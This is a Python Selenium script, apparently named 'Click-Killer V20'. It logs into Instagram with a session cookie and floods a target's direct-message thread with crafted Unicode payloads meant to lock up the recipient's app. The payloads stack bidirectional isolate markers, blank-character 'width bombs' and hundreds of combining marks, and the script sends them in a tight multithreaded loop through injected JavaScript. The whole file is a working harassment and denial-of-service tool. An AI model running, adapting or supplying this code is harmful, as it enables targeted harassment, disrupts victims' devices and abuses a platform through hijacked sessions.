# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (CLICK-KILLER V20)
# 📅 STATUS: EVENT-LOOP HIJACK | x20 DENSITY | GHOST INJECTION

import os, time, random, threading, sys, gc, tempfile
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- MATRIX CONFIG ---
THREADS = 2
SESSION_LIMIT = 300 
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_click_killer_payload(target_name):
    """The Click-Killer: Disables UI interaction via Isolate Nesting."""
    header = f"👑 𝖯𝖱𝖠𝖵𝖤𝖤𝖱 𝖯𝖠𝖯𝖠 👑 UI_INTERACTION_BLOCKED: {target_name.upper()}\n"
    
    # 💥 THE 'ISOLATE TRAP' (Recursive Nesting)
    # This forces the browser to traverse 150 layers for every mouse-click event.
    isolate_trap = "\u2066\u2067\u2068" * 150 
    
    # 💥 THE 'WIDTH-BOMB' (Horizontal Displacement)
    width_bomb = "\u2800\u00A0" * 150 
    
    # 💥 DENSITY x20 (200 marks per character)
    # Total GPU saturation.
    z_tower = "̸" * 200
    
    lines = [header, isolate_trap]
    
    for i in range(75):
        # We alternate 'First Strong Isolate' markers to break the button's event listener
        prefix = "\u2068\u202E" if i % 2 == 0 else "\u2069\u202D"
        lines.append(f"{width_bomb}{prefix}{target_name.upper()}_LOCKED{z_tower}")
        
    return "\n".join(lines)[:9990]

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def run_life_cycle(agent_id, cookie, target_id, target_name):
    while True:
        driver = None
        try:
            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ CLICK-KILLER V20 DEPLOYED...", flush=True)
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(7)
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(12)

            session_start = time.time()
            while (time.time() - session_start) < SESSION_LIMIT:
                try:
                    payload = get_click_killer_payload(target_name)
                    
                    # 🔥 THE GHOST INJECTION (Bypasses UI Lag)
                    driver.execute_script("""
                        var box = document.querySelector('div[role="textbox"]') || document.querySelector('textarea');
                        if (box) {
                            // Direct State Injection
                            box.focus();
                            document.execCommand('insertText', false, arguments[0]);
                            box.dispatchEvent(new Event('input', { bubbles: true }));
                            
                            // Native Click Dispatch to bypass the target's UI lag
                            var btns = document.querySelectorAll('div[role="button"]');
                            for(var b of btns) {
                                if(b.innerText.includes("Send") || b.innerText.includes("ပို့မည်")) {
                                    b.dispatchEvent(new MouseEvent('click', {view: window, bubbles: true, cancelable: true}));
                                }
                            }
                        }
                    """, payload)
                    
                    print(f"[M{MACHINE_ID}-A{agent_id}] 💀 UI_LOCKED", flush=True)
                    time.sleep(random.uniform(0.1, 0.3)) 
                    
                except:
                    time.sleep(5)
                    break 
        except Exception: pass
        finally:
            if driver: driver.quit()
            gc.collect()
            time.sleep(3)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    if not cookie or not target_id: sys.exit(1)
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
